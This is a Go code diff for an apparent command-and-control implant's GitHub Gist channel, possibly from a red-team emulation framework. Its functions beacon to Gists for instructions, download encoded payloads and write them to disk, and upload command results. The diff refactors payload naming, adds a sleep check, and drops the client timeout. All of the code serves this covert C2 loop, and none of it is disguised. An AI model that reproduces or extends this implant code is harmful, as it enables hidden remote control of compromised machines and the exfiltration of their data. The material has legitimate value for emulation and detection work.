@@ -6,15 +6,19 @@ import (
 	"fmt"
 	"github.com/google/go-github/github"
 	"golang.org/x/oauth2"
-	"math/rand"
 	"os"
 	"path/filepath"
 	"strings"
-	"time"
 
 	"../execute"
 	"../output"
 	"../util"
+)
+
+const (
+	githubTimeout = 60
+	githubTimeoutResetInterval = 5
+	githubError = 500
 )
 
 var (
@@ -41,7 +45,7 @@ func (contact GIST) Ping(server string) bool {
 
 //GetInstructions sends a beacon and returns instructions
 func (contact GIST) GetInstructions(profile map[string]interface{}) map[string]interface{} {
-	time.Sleep(time.Duration(1+rand.Intn(9))*time.Second)
+	checkValidSleepInterval(profile)
 	bites, heartbeat := gistBeacon(profile)
 	var out map[string]interface{}
 	if heartbeat == true {
@@ -61,9 +65,9 @@ func (contact GIST) GetInstructions(profile map[string]interface{}) map[string]i
 
 //DropPayloads downloads all required payloads for a command
 func (contact GIST) DropPayloads(payload string, server string, uniqueId string) []string {
-	payloads := strings.Split(strings.Replace(payload, " ", "", -1), ",")
-	if len(payloads) > 0 {
-		return gistPayloadDrop(uniqueId)
+	payloadNames := strings.Split(strings.Replace(payload, " ", "", -1), ",")
+	if len(payloadNames) > 0 {
+		return gistPayloadDrop(uniqueId, payloadNames)
 	}
 	return []string{}
 }
@@ -108,16 +112,16 @@ func gistResults(uniqueId string, commandID interface{}, result []byte, status s
 	}
 }
 
-func gistPayloadDrop(uniqueId string) []string {
+func gistPayloadDrop(uniqueId string, payloadNames []string) []string {
 	var droppedPayloads []string
 	payloads := getGists("payloads", uniqueId)
-	for _, payload := range payloads {
-		output.VerbosePrint(fmt.Sprintf("[*] Downloaded new payload: %s", payload))
-		location := filepath.Join(payload)
+	for index, payload := range payloads {
+		output.VerbosePrint(fmt.Sprintf("[*] Downloaded new payload: %s", payloadNames[index]))
+		location := filepath.Join(payloadNames[index])
 		if util.Exists(location) == false {
 			util.WritePayloadBytes(location, util.Decode(payload))
 		}
-		droppedPayloads = append(droppedPayloads, payload)
+		droppedPayloads = append(droppedPayloads, payloadNames[index])
 	}
 	return droppedPayloads
 }
@@ -135,7 +139,7 @@ func createGist(gistType string, uniqueId string, data []byte) int {
 	_, resp, err := c2Client.Gists.Create(ctx, &gist)
 	if err != nil {
 		output.VerbosePrint(fmt.Sprintf("%s", err))
-		return 500
+		return githubError
 	}
 	return resp.StatusCode
 }
@@ -165,14 +169,18 @@ func getGistDescriptor(gistType string, uniqueId string) string {
 	return fmt.Sprintf("%s-%s", gistType, uniqueId)
 }
 
+func checkValidSleepInterval(profile map[string]interface{}) {
+	if profile["sleep"] == githubTimeout{
+		util.Sleep(float64(githubTimeoutResetInterval))
+	}
+}
+
 func createNewClient() *github.Client {
 	ctx := context.Background()
 	ts := oauth2.StaticTokenSource(
 		&oauth2.Token{AccessToken: token},
 	)
 	tc := oauth2.NewClient(ctx, ts)
-	tc.Timeout = 5 * time.Second
-	tc.CloseIdleConnections()
 	c2Client := github.NewClient(tc)
 	return c2Client
 }
